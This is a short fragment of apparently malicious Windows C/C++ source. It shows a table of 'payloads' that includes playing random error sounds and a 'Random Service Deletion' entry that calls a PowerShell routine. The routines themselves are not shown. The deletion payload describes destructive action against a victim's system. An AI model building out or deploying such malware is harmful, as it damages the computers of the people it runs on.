...
PAYLOAD payloads[] = {
	...
	Payload(L"Random error sounds", payloadHostDefault, (LPVOID)PayloadSound, 50000, TRUE), 
    ...
    Payload(L"Random Service Deletion", payloadHostDefault, (LPVOID)PayloadInvokePowershell, 20000, TRUE),  
